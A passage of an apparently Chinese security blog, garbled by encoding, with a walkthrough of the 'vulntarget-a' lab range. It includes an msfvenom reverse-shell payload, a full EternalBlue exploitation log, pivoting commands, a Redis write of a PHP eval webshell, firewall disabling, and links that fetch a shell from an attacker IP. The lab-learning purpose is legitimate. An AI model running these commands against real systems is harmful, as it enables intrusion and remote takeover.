class="line">å¤§å†™HTTP</span><br><span class="line"></span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line">HTTP://10.0.20.30:3321/shell.php</span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.30:3300/1.txt</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>å°è¯•äº†å¥½å¤šæ¬¡ï¼Œåªä¼šåˆ›å»ºä¸€ä¸ªç©ºçš„shell.php ä¸‹è½½ä¸€å¥è¯ä¸€ç›´å¤±è´¥ ä¼ ä¸ä¸Šå»ï¼Œç„¶ååç»­æˆ‘å°±åœ¨é¶æœºä¸Šè‡ªè¡Œåˆ›å»ºäº†ä¸€ä¸ªä¸€å¥è¯ï¼Œç„¶åè®¿é—®é¡µé¢å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä½†æ˜¯å»è¿èšå‰‘å•¥çš„éƒ½è¿ä¸ä¸Šâ€¦â€¦æ— è¯­</p>
<p>åŸºæœ¬ä¸Šæ˜¯ç¬¬äºŒå°é¶æœºçš„é—®é¢˜äº†ï¼Œåé¢çš„å°±æ²¡æ³•å†ç»§ç»­ä¸‹å»äº†â€¦ </p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-aé¶æœº</title>
    <url>/posts/3edb83f3/</url>
    <content><![CDATA[<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ">https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ</a><br><a href="https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht">https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</a></p>
</blockquote>
<h3 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h3><p><img src="/posts/3edb83f3/1.png"></p>
<p>ï¼ˆç›´æ¥åœ¨crowé‚£ä¸ªæ‹¿è¿‡æ¥çš„ï¼‰</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="åŸŸæ§-2019"><a href="#åŸŸæ§-2019" class="headerlink" title="åŸŸæ§ 2019"></a>åŸŸæ§ 2019</h4><p>administrator / Admin@666</p>
<p>IP 10.0.10.110</p>
<h4 id="å¤–ç½‘æœºå™¨-win7"><a href="#å¤–ç½‘æœºå™¨-win7" class="headerlink" title="å¤–ç½‘æœºå™¨ win7"></a>å¤–ç½‘æœºå™¨ win7</h4><p>win7 / admin</p>
<p>IP 192.168.0.133 / 10.0.20.98</p>
<h4 id="åŸŸå†…ç”¨æˆ·-2016"><a href="#åŸŸå†…ç”¨æˆ·-2016" class="headerlink" title="åŸŸå†…ç”¨æˆ· 2016"></a>åŸŸå†…ç”¨æˆ· 2016</h4><p>Administrator / Admin@123</p>
<p>balsec.com\win2016 / Admin#123</p>
<p>IP 10.0.10.111 / 10.0.20.99</p>
<br>

<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><p>å¤–ç½‘æœºå™¨æ˜¯ä¸€å°win7 å·²çŸ¥IPä¸º 10.10.10.248</p>
<h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>å…ˆç”¨nmapæ‰«ä¸€ä¸‹ å‘ç°å°±ä¸€ä¸ª80 webç«¯å£</p>
<p><img src="/posts/3edb83f3/2.png" alt="æˆªå›¾"></p>
<h4 id="é€šè¾¾OA-Getshell"><a href="#é€šè¾¾OA-Getshell" class="headerlink" title="é€šè¾¾OA Getshell"></a>é€šè¾¾OA Getshell</h4><p>10.10.10.248 ä¸»é¡µæ˜¯ä¸€å°é€šè¾¾OA ç›´æ¥ä½¿ç”¨å·¥å…·æ¢­å“ˆ</p>
<p><img src="/posts/3edb83f3/3.png" alt="æˆªå›¾"></p>
<p>è¿æ¥èšå‰‘</p>
<p>æ‰§è¡Œ<code>whoami</code> ç›´æ¥æ˜¯systemæƒé™</p>
<p><img src="/posts/3edb83f3/4.png" alt="æˆªå›¾"></p>
<p>ç„¶å <code>systeminfo</code> <code>ipconfig /all</code></p>
<p>å‘ç°æœ‰ä¸¤å¼ ç½‘å¡ ä¸åœ¨åŸŸå†…</p>
<p><img src="/posts/3edb83f3/5.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é‡Œç›´æ¥ä¸ŠCS</p>
<p>æœ¬æƒ³ç›´æ¥ä»cs è½¬åˆ°msfï¼Œä¸€ç›´è¿ä¸ä¸Šæ¢payloadä¹Ÿä¸è¡Œï¼Œå°±ç›´æ¥ä¸Šä¸ªmsfé©¬</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.114 lport=8888 -f exe &gt; shell.exe</code></p>
<br>

<h4 id="ms17-010åˆ©ç”¨"><a href="#ms17-010åˆ©ç”¨" class="headerlink" title="ms17-010åˆ©ç”¨"></a>ms17-010åˆ©ç”¨</h4><p>è¿™é‡Œçš„win7ä¹Ÿå­˜åœ¨ms17010æ¼æ´ æˆåŠŸæ‹¿åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">sf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.114:4444 </span><br><span class="line">[*] 10.10.10.248:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.10.10.248:445 - The target is vulnerable.</span><br><span class="line">[*] 10.10.10.248:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.248:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.248:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.248:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.248:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.248:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.248:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.248:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.248:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.248:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.248:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.248:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.10.248</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.114:4444 -&gt; 10.10.10.248:50270) at 2022-03-22 02:50:35 -0400</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:05</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.248</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::2de1:362a:d91a:ed60</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:0f</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.0.20.98</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5146:76d1:7288:d8be</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:a0a:af8</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  13</span><br><span class="line">    10.10.10.1       fc:7c:02:73:a5:40  11</span><br><span class="line">    10.10.10.114     34:e1:2d:a3:ac:4b  11</span><br><span class="line">    10.10.10.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.2        00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  11</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  13</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  13</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  13</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°å­˜åœ¨ä¸¤ä¸ªç½‘å¡ å¦ä¸€ä¸ªç½‘æ®µä¸º <code>10.0.20.0/24</code></p>
<p>ç„¶åå»è¿ç§»è¿›ç¨‹ æ·»åŠ è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Current server process: spoolsv.exe (1140)</span><br><span class="line">[*] Spawning notepad.exe process to migrate into</span><br><span class="line">[*] Spoofing PPID 0</span><br><span class="line">[*] Migrating into 3200</span><br><span class="line">[+] Successfully migrated into process 3200</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route print</code> æŸ¥çœ‹è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.0.20.0          255.255.255.0      Session 2</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 2</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨msf ç«¯å£æ‰«ææ¨¡å—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">ports =&gt; 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:3389 - TCP OPEN</span><br><span class="line"></span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  26 of 256 hosts (10% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  56 of 256 hosts (21% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  79 of 256 hosts (30% complete)</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:6379 - TCP OPEN</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 129 of 256 hosts (50% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 158 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 233 of 256 hosts (91% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰«åˆ°ä¸¤å°æœºå™¨  98æ˜¯æ‹¿åˆ°çš„å¤–ç½‘win7  99æ˜¯è¿™ä¸ªç½‘æ®µçš„å¦ä¸€å°æœºå™¨</p>
<br>

<p>è¿™é‡Œè®¾ç½®ä¸ªä»£ç†(ä¹‹å‰æˆ‘éƒ½æ˜¯æ‰‹åŠ¨å»é…è·¯ç”± æ²¡ç”¨è¿‡è¿™ä¸ªåœ¨msf sessionä¸­è‡ªåŠ¨é…çš„  ç„¶åå°±æ‰‹åŠ¨å»é…çš„ ç»“æœéƒ½æ˜¯å¯åŠ¨å°±ç»“æŸ ç„¶åæˆ‘è‡ªå·±å†å»proxychain è¿127.0.0.1:1080å‘ç°è‡ªåŠ¨è·¯ç”±é‚£é‡Œå·²ç»ç»™é…ç½®å¥½äº†â€¦) </p>
<br>

<h3 id="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"><a href="#æ¨ªå‘ç¬¬äºŒå°æœºå™¨" class="headerlink" title="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"></a>æ¨ªå‘ç¬¬äºŒå°æœºå™¨</h3><p>99è¿™å°æœºå™¨å¼€æ”¾äº†80ç«¯å£å’Œ6379ç«¯å£ å¯æµ‹è¯•ä¸‹æ˜¯å¦å­˜åœ¨redisæœªæˆæƒ</p>
<p>å…ˆç”¨dirb å»æ‰«ä¸€ä¸‹80ç«¯å£çš„ç›®å½• dirbå¤ªæ…¢äº† æ²¡æ‰“æ‰«åˆ°å•¥æ¢dirsearch </p>
<p><code>proxychain python3 dirsearch.py -u http://10.0.20.99</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">403   225B   http://10.0.20.99:80/Trace.axd::$DATA</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php</span><br><span class="line">200    11B   http://10.0.20.99:80/index.pHp</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php.</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php/login/</span><br><span class="line">403   225B   http://10.0.20.99:80/index.php::$DATA</span><br><span class="line">200    14KB  http://10.0.20.99:80/l.php</span><br><span class="line">200    70KB  http://10.0.20.99:80/phpinfo.php</span><br><span class="line">403   226B   http://10.0.20.99:80/web.config::$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åªæœ‰l.php å’Œ phpinfoæœ‰ç‚¹ä¿¡æ¯ l.phpæ˜¯ä¸€ä¸ªæ¢é’ˆ</p>
<p><img src="/posts/3edb83f3/6.png" alt="æˆªå›¾"></p>
<p><img src="/posts/3edb83f3/7.png" alt="æˆªå›¾"></p>
<p>é€šè¿‡æ¢é’ˆå¯ç”¨å‘ç°æ˜¯ä½¿ç”¨phpstudyæ­å»ºçš„ï¼Œç»å¯¹è·¯å¾„ä¸º<code> C:/phpStudy/PHPTutorial/WWW</code> </p>
<h5 id="CSå»ºç«‹socks4ä»£ç†"><a href="#CSå»ºç«‹socks4ä»£ç†" class="headerlink" title="CSå»ºç«‹socks4ä»£ç†"></a>CSå»ºç«‹socks4ä»£ç†</h5><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨csçš„ä»£ç†å»è®¿é—®webæœåŠ¡</p>
<p>å³é”®æ‹¿åˆ°æƒé™çš„ä¸»æœº â€”&gt; Pivoting â€”&gt; Socks Server</p>
<p>ç„¶åä¼šç”Ÿæˆä¸€ä¸ªéšæœºæœªå ç”¨çš„ç«¯å£ï¼Œç‚¹å‡»å¯åŠ¨å³å¯</p>
<p><img src="/posts/3edb83f3/8.png" alt="æˆªå›¾"></p>
<p>ç„¶åä½¿ç”¨ä»£ç† è¿æ¥ socks4 CSip å’Œè¿™ä¸ªç«¯å£å³å¯</p>
<p>ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨å‰é¢msfèµ·çš„ä»£ç†ï¼‰</p>
<br>

<h4 id="Redisæœªæˆæƒgetshell"><a href="#Redisæœªæˆæƒgetshell" class="headerlink" title="Redisæœªæˆæƒgetshell"></a>Redisæœªæˆæƒgetshell</h4><p>æ²¡å•¥åˆ©ç”¨ç‚¹ï¼Œé‚£å°±å»è€ƒè™‘ 6379çš„redisäº†</p>
<p><code>proxychains redis-cli -h 10.0.20.99</code> å‘ç°æœªæˆæƒ</p>
<p>å¯ç›´æ¥å†™ä¸€ä¸ªwebshell ç„¶åå»è¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_REQUEST[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></table></figure>

<p>èƒ½å†™å…¥ä½†æ˜¯æ²¡æ³•è¿ä¸Šèšå‰‘â€¦ â€¦ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename info.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªphpinfoä¹Ÿæ²¡å•¥é—®é¢˜ é‚£åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯èšå‰‘ä»£ç†çš„é—®é¢˜äº†</p>
<p><img src="/posts/3edb83f3/9.png" alt="æˆªå›¾"></p>
<br>

<p>ä½¿ç”¨èšå‰‘è‡ªèº«ä»£ç†æ²¡è¿ä¸Šï¼Œä½¿ç”¨socksCapä¹Ÿæ²¡è¿ä¸Šï¼Œä½¿ç”¨proxifierå°±æˆåŠŸè¿ä¸Šäº†â€¦.</p>
<p><img src="/posts/3edb83f3/10.png" alt="æˆªå›¾"></p>
<br>

<p><code>whomai </code> å¾—åˆ°ä¹Ÿæ˜¯systemæƒé™</p>
<p><code>systeminfo</code>  å¾—åˆ°åŸŸä¿¡æ¯å’Œä¸¤å¼ ç½‘å¡</p>
<p><img src="/posts/3edb83f3/11.png" alt="æˆªå›¾"></p>
<p>åŸŸåä¸º <code>vulntarget.com</code>  ä¸€å¼ ç½‘å¡ä¸º <code>10.0.20.0/24</code> å±äºdmzåŒºçš„ç½‘æ®µ</p>
<p>ç„¶å<code>10.0.10.0/24</code> åŸºæœ¬ä¸Šå¯ä»¥åˆ¤å®šä¸ºæ˜¯åŸŸç½‘æ®µ</p>
<p>ç„¶åæŸ¥ä¸€ä¸‹æ€è½¯ <code>tasklist -svc</code></p>
<p><img src="/posts/3edb83f3/12.png" alt="æˆªå›¾"></p>
<p>å­˜åœ¨WinDef</p>
<p>ç”Ÿæˆä¸€ä¸ªé©¬ å†è¿˜æ²¡è¢«æ€çš„æ—¶å€™ ä¹Ÿè¿ä¸ä¸Šï¼Œä¼°è®¡æ˜¯å¼€äº†é˜²ç«å¢™</p>
<p><code>netsh advfirewall show allprofiles</code> æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</p>
<p><img src="/posts/3edb83f3/13.png" alt="æˆªå›¾"></p>
<p>ä¸€é¡¿ä¹±ç ï¼Œå…ˆå»æ”¹ä¸€ä¸‹ç¼–ç æ–¹å¼ æ”¹æˆgbkåå°±å¯ä»¥äº†</p>
<p><img src="/posts/3edb83f3/14.png" alt="æˆªå›¾"></p>
<br>

<p><code>netsh advfirewall set allprofiles state off</code> å…³é—­é˜²ç«å¢™(è¿™é‡Œæ˜¯systemæƒé™ ç›´æ¥å°±å¯å…³é—­)</p>
<p><img src="/posts/3edb83f3/15.png" alt="æˆªå›¾"></p>
<br>

<h4 id="CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016"><a href="#CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016" class="headerlink" title="CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016"></a>CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016</h4><p>ç„¶åå°è¯•ä½¿ç”¨ä¹‹å‰çš„å¤–ç½‘win7çš„cs beacon ä»£ç†è¿åˆ°win2016ä¸Š</p>
<p>ä½¿ç”¨ç«¯å£è½¬å‘ å³é”®win7beacon â€”&gt; pivoting â€”&gt; Listener â€¦ â€”&gt;</p>
<p><img src="/posts/3edb83f3/16.png" alt="æˆªå›¾"></p>
<p>ç„¶åä¿å­˜åä¼šåœ¨listenersä¸­ç”Ÿæˆè¿™ä¸ªé€šè¿‡win7åšä»£ç†çš„listner</p>
<p>ç„¶åå»ä¸Šé©¬ï¼Œä½†æ˜¯ä¸Šå»å°±ä¼šè¢«WinDefç»™æ€æ‰â€¦.. å¡ä½äº†æ˜‚</p>
<br>

<h4 id="msfä¸Šçº¿win2016"><a href="#msfä¸Šçº¿win2016" class="headerlink" title="msfä¸Šçº¿win2016"></a>msfä¸Šçº¿win2016</h4><h5 id="åå‘é©¬ä¸Šçº¿å¤±è´¥äº†"><a href="#åå‘é©¬ä¸Šçº¿å¤±è´¥äº†" class="headerlink" title="åå‘é©¬ä¸Šçº¿å¤±è´¥äº†"></a>åå‘é©¬ä¸Šçº¿å¤±è´¥äº†</h5><p>è¿™é‡Œipä¸ºwin7çš„å†…ç½‘IP</p>
